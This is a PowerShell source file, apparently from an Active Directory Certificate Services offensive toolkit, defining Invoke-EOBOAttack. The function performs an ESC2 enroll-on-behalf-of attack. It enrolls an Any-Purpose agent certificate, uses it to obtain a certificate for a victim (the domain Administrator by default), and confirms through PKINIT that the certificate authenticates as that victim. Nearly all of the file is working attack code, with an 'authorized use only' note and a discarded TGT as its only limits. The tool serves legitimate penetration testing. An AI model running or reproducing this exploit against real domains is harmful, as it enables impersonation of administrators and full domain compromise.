function Invoke-EOBOAttack {
    <#
        .SYNOPSIS
        Performs an ESC2 attack: uses an Any-Purpose-EKU (or no-EKU) certificate as an
        Enrollment Agent to Enroll On Behalf Of a target user, then verifies via PKINIT.
        Pure PowerShell - no external tools.

        .DESCRIPTION
        ESC2 abuses a certificate template whose Extended Key Usage is Any Purpose
        (2.5.29.37.0) or absent. A certificate issued from such a template is valid for
        any application - including acting as a Certificate Request Agent
        (1.3.6.1.4.1.311.20.2.1). That lets the holder Enroll On Behalf Of (EOBO) another
        principal against a template that requires an agent signature
        (msPKI-RA-Signature >= 1 and msPKI-RA-Application-Policies = Certificate Request Agent).

        This function:
        1. Enrolls an agent certificate from the ESC2 (Any-Purpose) template.
        2. Builds a target PKCS#10 for the victim, wraps it in a CMC request with
           RequesterName set to the victim, and co-signs it with the agent cert
           (Enroll On Behalf Of, MS-WCCE 3.1.1.4.3.1.4).
        3. Submits the EOBO request to the CA for the agent-protected template.
        4. Verifies the issued target certificate authenticates as the victim via the
           vendored PSPkinit Invoke-PkinitAuthentication. The TGT is zeroed/discarded -
           never injected, written to disk, or applied to the session.

        .PARAMETER AgentTemplateObject
        DirectoryEntry of the ESC2-vulnerable template (Any Purpose EKU or no EKU, and
        enrollable by the current principal). Used to obtain the enrollment-agent cert.

        .PARAMETER TargetTemplateName
        Name of the agent-protected template to enroll the victim into (e.g. a schema v1
        'User'-class template with msPKI-RA-Signature >= 1). Defaults to 'UserEOBO'.

        .PARAMETER CertificateAuthority
        CA configuration string "CA-SERVER\CA-NAME". Auto-discovered if omitted.

        .PARAMETER TargetPrincipal
        DirectoryEntry of the victim to enroll on behalf of. Defaults to domain
        Administrator (RID 500).

        .PARAMETER WhatIf
        Shows the attack without contacting the CA or KDC.

        .OUTPUTS
        PSCustomObject with Success, AgentTemplate, TargetTemplate, TargetPrincipal,
        TargetSID, AgentCertThumbprint, TargetCertThumbprint, PkinitVerified, Principal,
        Realm, TgtEndTime, Error.

        .EXAMPLE
        $agent = Get-AdcsObjects | Where-Object { $_.Properties['name'].Value -eq 'AgentAnyPurpose' }
        Invoke-EOBOAttack -AgentTemplateObject $agent -TargetTemplateName 'UserEOBO'

        .NOTES
        WARNING: real certificate enrollment + PKINIT authentication. Authorized use only.
        The KDC logs the authentication; issued certs are logged on the CA and revocable.

        .LINK
        https://posts.specterops.io/certified-pre-owned-d95910965cd2
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [ValidateNotNull()]
        [System.DirectoryServices.DirectoryEntry]$AgentTemplateObject,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$TargetTemplateName = 'UserEOBO',

        [Parameter()]
        [string]$CertificateAuthority,

        [Parameter()]
        [System.DirectoryServices.DirectoryEntry]$TargetPrincipal
    )

    #requires -Version 5.1

    begin {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand)..."

        # Load vendored PSPkinit + ESCalator enrollment helpers (idempotent)
        $pspk = Join-Path $PSScriptRoot 'PSPkinit'
        foreach ($f in 'Asn1.ps1','KerberosCrypto.ps1','PkinitMessages.ps1','PkinitModPow.ps1','Pkinit.ps1','CertEnroll.ps1','Invoke-PkinitAuthentication.ps1') {
            $p = Join-Path $pspk $f; if (Test-Path $p) { . $p }
        }
        foreach ($f in 'ConvertTo-Pkcs8PrivateKey.ps1','ConvertTo-NtdsSidExtension.ps1','Request-ESC1Certificate.ps1') {
            $p = Join-Path $PSScriptRoot $f; if (Test-Path $p) { . $p }
        }

        # Domain info
        $domainSid = $null; $netbiosDomain = $env:USERDOMAIN; $domainFqdn = $null
        try {
            $rootDSE = New-Object System.DirectoryServices.DirectoryEntry('LDAP://RootDSE')
            $defaultNC = $rootDSE.Properties['defaultNamingContext'].Value
            $domainFqdn = ($defaultNC -replace 'DC=','' -replace ',','.')
            $domainEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$defaultNC")
            if ($domainEntry.Properties['objectSid'].Value) {
                $domainSid = (New-Object System.Security.Principal.SecurityIdentifier($domainEntry.Properties['objectSid'].Value, 0)).Value
            }
        } catch { Write-Warning "Could not retrieve domain info: $($_.Exception.Message)" }
    }

    process {
        $agentTemplateName = $AgentTemplateObject.Properties['name'].Value

        $fail = { param($m) Write-Error $m; return [PSCustomObject]@{
            Success=$false; AgentTemplate=$agentTemplateName; TargetTemplate=$TargetTemplateName
            TargetPrincipal=$null; TargetSID=$null; AgentCertThumbprint=$null; TargetCertThumbprint=$null
            PkinitVerified=$false; Principal=$null; Realm=$null; TgtEndTime=$null; Error=$m } }

        if ($AgentTemplateObject.SchemaClassName -ne 'pKICertificateTemplate') {
            return & $fail "AgentTemplateObject is not a certificate template: $($AgentTemplateObject.SchemaClassName)"
        }

        # Confirm ESC2 primitive: Any Purpose EKU or no EKU
        $ekus = @($AgentTemplateObject.Properties['pKIExtendedKeyUsage'].Value)
        $anyPurpose = ($ekus -contains '2.5.29.37.0') -or ($ekus.Count -eq 0)
        if (-not $anyPurpose) {
            Write-Warning "Template '$agentTemplateName' is not Any-Purpose/no-EKU (EKUs: $($ekus -join ', ')). ESC2 may not apply."
        }

        # Resolve victim
        $targetSID = $null; $targetName = $null; $targetUPN = $null; $targetDN = $null; $targetNT = $null
        if ($TargetPrincipal) {
            try {
                $targetSID = (New-Object System.Security.Principal.SecurityIdentifier($TargetPrincipal.Properties['objectSid'].Value, 0)).Value
                $targetName = $TargetPrincipal.Properties['sAMAccountName'].Value
                $targetUPN = $TargetPrincipal.Properties['userPrincipalName'].Value
                $targetDN = $TargetPrincipal.Properties['distinguishedName'].Value
            } catch { return & $fail "Failed to read target principal: $($_.Exception.Message)" }
        } else {
            if (-not $domainSid) { return & $fail 'No domain SID for default Administrator target' }
            $targetSID = "$domainSid-500"; $targetName = 'Administrator'
            # resolve DN/UPN
            try {
                $adm = New-Object System.DirectoryServices.DirectoryEntry("LDAP://<SID=$targetSID>")
                $targetDN = $adm.Properties['distinguishedName'].Value
                $targetUPN = $adm.Properties['userPrincipalName'].Value
            } catch { }
        }
        if (-not $targetUPN) { $targetUPN = "$targetName@$domainFqdn" }
        if (-not $targetDN) { $targetDN = "CN=$targetName,CN=Users," + ($domainFqdn -split '\.' | ForEach-Object { "DC=$_" }) -join ',' }
        $targetNT = "$netbiosDomain\$targetName"
        Write-Verbose "Victim: $targetName  SID=$targetSID  UPN=$targetUPN  DN=$targetDN"

        # Discover CA
        if (-not $CertificateAuthority) {
            try {
                $caObjects = Get-AdcsObjects | Where-Object { $_.SchemaClassName -eq 'pKIEnrollmentService' }
                $caFullName = Get-CAFullName -CAObjects $caObjects
                $CertificateAuthority = if ($caFullName -is [string]) { $caFullName } else { $caFullName[0] }
            } catch { }
            if (-not $CertificateAuthority) { return & $fail 'Could not auto-discover Certificate Authority' }
        }

        $realm = $domainFqdn.ToUpperInvariant()
        try { $kdc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name }
        catch { $kdc = ($CertificateAuthority -split '\\')[0] }

        if (-not $PSCmdlet.ShouldProcess("$agentTemplateName -> $TargetTemplateName for $targetName", 'ESC2 EOBO attack')) {
            Write-Host "What if: enroll agent cert from '$agentTemplateName', EOBO '$targetName' into '$TargetTemplateName', PKINIT-verify as $targetUPN against $kdc" -ForegroundColor Yellow
            return [PSCustomObject]@{ Success=$true; AgentTemplate=$agentTemplateName; TargetTemplate=$TargetTemplateName
                TargetPrincipal=$targetName; TargetSID=$targetSID; AgentCertThumbprint=$null; TargetCertThumbprint=$null
                PkinitVerified=$null; Principal=$null; Realm=$realm; TgtEndTime=$null; Error='WhatIf' }
        }

        Write-Warning "Executing ESC2 EOBO: agent template '$agentTemplateName', target '$TargetTemplateName', victim '$targetName'"

        $agentReq = $null; $targetReq = $null
        $agentEnrollment = $null; $agentThumb = $null
        try {
            # --- Step 1: enroll the ESC2 (Any-Purpose) agent cert into CurrentUser\My.
            #    CertEnroll persists the CNG key there, and CSignerCertificate searches
            #    CurrentUser by default - the two must agree. ---
            Write-Host '[i] Step 1: enrolling Any-Purpose agent certificate...' -ForegroundColor Cyan
            $agentReq = New-PkinitCertificateSigningRequest -Subject "CN=$targetName Agent" -San $targetUPN -SanType UserPrincipalName
            $agentB64 = Submit-PkinitCertificateSigningRequest -Base64Csr $agentReq.Base64Csr -Template $agentTemplateName -San $targetUPN -SanType UserPrincipalName -CertificateAuthorityConfig $CertificateAuthority
            Install-PkinitCertificateResponse -Enrollment $agentReq.Enrollment -Base64Certificate $agentB64
            $agentEnrollment = $agentReq.Enrollment
            $agentCertObj = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new([Convert]::FromBase64String(($agentB64 -replace '\s','')))
            $agentThumb = $agentCertObj.Thumbprint
            $agentEku = ($agentCertObj.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.37' }).Format($false)
            Write-Host "[+] Agent cert issued: $agentThumb (EKU $agentEku)" -ForegroundColor Green

            # --- Step 2: build inner target CSR (CertEnroll) + EOBO CMC co-signed by agent ---
            Write-Host '[i] Step 2: building EOBO request co-signed by the agent...' -ForegroundColor Cyan
            $innerKey = New-Object -ComObject X509Enrollment.CX509PrivateKey
            $innerKey.ProviderName = 'Microsoft Software Key Storage Provider'
            $innerKey.Length = 2048
            $innerKey.KeySpec = 1            # AT_KEYEXCHANGE
            $innerKey.MachineContext = $false
            $innerKey.ExportPolicy = 1       # exportable
            $innerKey.Create()

            $innerDn = New-Object -ComObject X509Enrollment.CX500DistinguishedName
            $innerDn.Encode($targetDN, 0)

            # SAN = target UPN on the inner request
            $alt = New-Object -ComObject X509Enrollment.CAlternativeName
            $alt.InitializeFromString(11, $targetUPN)  # 11 = XCN_CERT_ALT_NAME_USER_PRINCIPAL_NAME
            $alts = New-Object -ComObject X509Enrollment.CAlternativeNames
            $alts.Add($alt)
            $sanExt = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
            $sanExt.InitializeEncode($alts)

            # Client Auth EKU on the inner request
            $ekuOid = New-Object -ComObject X509Enrollment.CObjectId
            $ekuOid.InitializeFromValue('1.3.6.1.5.5.7.3.2')
            $ekuColl = New-Object -ComObject X509Enrollment.CObjectIds
            $ekuColl.Add($ekuOid)
            $ekuExt = New-Object -ComObject X509Enrollment.CX509ExtensionEnhancedKeyUsage
            $ekuExt.InitializeEncode($ekuColl)

            $inner = New-Object -ComObject X509Enrollment.CX509CertificateRequestPkcs10
            $inner.InitializeFromPrivateKey(1, $innerKey, '')  # ContextUser
            $inner.Subject = $innerDn
            $inner.X509Extensions.Add($sanExt)
            $inner.X509Extensions.Add($ekuExt)
            $inner.Encode()

            $cmc = New-Object -ComObject X509Enrollment.CX509CertificateRequestCmc
            $cmc.InitializeFromInnerRequest($inner)
            $cmc.RequesterName = $targetNT
            $signer = New-Object -ComObject X509Enrollment.CSignerCertificate
            $signer.Initialize($false, 0, 12, $agentThumb)  # ContextUser, FindByThumbprint
            $cmc.SignerCertificate = $signer
            $cmc.Encode()

            $enroll = New-Object -ComObject X509Enrollment.CX509Enrollment
            $enroll.InitializeFromRequest($cmc)
            $eoboB64 = $enroll.CreateRequest(1)  # Base64

            # --- Step 3: submit EOBO for the agent-protected template ---
            Write-Host "[i] Step 3: submitting EOBO request to '$CertificateAuthority' for template '$TargetTemplateName'..." -ForegroundColor Cyan
            $cr = New-Object -ComObject CertificateAuthority.Request
            $disp = $cr.Submit(0xFF, $eoboB64, "CertificateTemplate:$TargetTemplateName", $CertificateAuthority)
            if ($disp -ne 3) { return & $fail "EOBO request not issued (disposition $disp): $($cr.GetDispositionMessage())" }
            $targetB64 = $cr.GetCertificate(1)
            $targetBare = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new([Convert]::FromBase64String(($targetB64 -replace '\s','')))
            # Bind the issued cert to the inner request's private key via the enrollment
            # object, which tracks the inner key across submission. InstallResponse stores
            # the cert+key in CurrentUser\My; we then re-read it so the key resolves via CNG.
            try {
                $enroll.InstallResponse(2, $targetB64, 1, '')  # AllowUntrustedCertificate, Base64
                $tread = [System.Security.Cryptography.X509Certificates.X509Store]::new('My','CurrentUser')
                $tread.Open('ReadOnly')
                $targetCert = $tread.Certificates | Where-Object { $_.Thumbprint -eq $targetBare.Thumbprint }
                $tread.Close()
                if (-not $targetCert) { $targetCert = $targetBare }
            } catch {
                Write-Verbose "InstallResponse key binding failed: $($_.Exception.Message)"
                $targetCert = $targetBare
            }
            Write-Host "[+] Target cert issued: $($targetBare.Thumbprint)  Subject: $($targetBare.Subject)  HasKey=$($targetCert.HasPrivateKey)" -ForegroundColor Green

            # --- Step 4: PKINIT-verify the target cert as the victim (TGT discarded) ---
            Write-Host '[i] Step 4: verifying target cert via PKINIT...' -ForegroundColor Cyan
            $pkVerified = $false; $pkPrincipal = $null; $pkEnd = $null
            try {
                $auth = Invoke-PkinitAuthentication -Certificate $targetCert -ClientName $targetUPN -Realm $realm -KdcHostname $kdc
                $pkVerified = [bool]$auth.Verified; $pkPrincipal = $auth.CName; $pkEnd = $auth.EndTime
                Write-Host "[+] PKINIT verified: TGT for $($auth.CName) (until $($auth.EndTime)). TGT discarded, not injected." -ForegroundColor Green
            } catch {
                Write-Warning "PKINIT verification failed: $($_.Exception.Message)"
            }

            return [PSCustomObject]@{
                Success              = $true
                AgentTemplate        = $agentTemplateName
                TargetTemplate       = $TargetTemplateName
                TargetPrincipal      = $targetName
                TargetSID            = $targetSID
                AgentCertThumbprint  = $agentThumb
                TargetCertThumbprint = $targetCert.Thumbprint
                PkinitVerified       = $pkVerified
                Principal            = $pkPrincipal
                Realm                = $realm
                TgtEndTime           = $pkEnd
                Error                = $null
            }
        } catch {
            return & $fail "ESC2 attack failed: $($_.Exception.Message)"
        } finally {
            # Clean up the agent cert from CurrentUser\My; the EOBO target cert lives in
            # the caller's hands only (not persisted by this function).
            if ($agentThumb) {
                try {
                    $st = [System.Security.Cryptography.X509Certificates.X509Store]::new('My','CurrentUser')
                    $st.Open('ReadWrite')
                    $leftover = $st.Certificates | Where-Object { $_.Thumbprint -eq $agentThumb }
                    foreach ($c in $leftover) { $st.Remove($c) }
                    $st.Close()
                } catch { Write-Verbose "agent cert cleanup: $($_.Exception.Message)" }
            }
        }
    }

    end {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand)..."
    }
}
